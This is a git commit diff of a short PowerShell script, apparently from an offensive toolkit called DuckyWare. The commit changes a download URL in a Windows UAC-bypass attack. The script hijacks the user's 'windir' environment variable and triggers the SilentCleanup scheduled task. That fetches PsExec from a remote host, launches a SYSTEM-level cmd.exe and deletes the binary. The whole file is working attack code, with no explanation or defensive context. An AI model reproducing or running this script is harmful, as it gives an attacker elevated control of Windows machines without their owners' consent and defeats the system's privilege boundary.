297ab8f60f476c2b30c7448edfa9db2bc7d349a1
LordDerpyCat123 <41979025+b4ck3nd-dev@users.noreply.github.com>
2021-11-11 21:05:53 +1100

    Update system.ps1

--- system.ps1
+++ system.ps1
@@ -1,4 +1,4 @@
-$program = "powershell.exe -noexit wget '192.168.2.136:4444/pstools/PsExec.exe' -OutFile psexec.exe; .\psexec.exe -s -i cmd.exe; rm psexec.exe; exit; #"
+$program = "powershell.exe -noexit wget 'https://github.com/b4ck3nd-dev/DuckyWare/blob/main/PsExec.exe?raw=true' -OutFile psexec.exe; .\psexec.exe -s -i cmd.exe; rm psexec.exe; exit; #"
 Set-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value $program -Force
 #For x64 shell in Windows x64:
 Start-Process schtasks.exe -ArgumentList "/Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I"
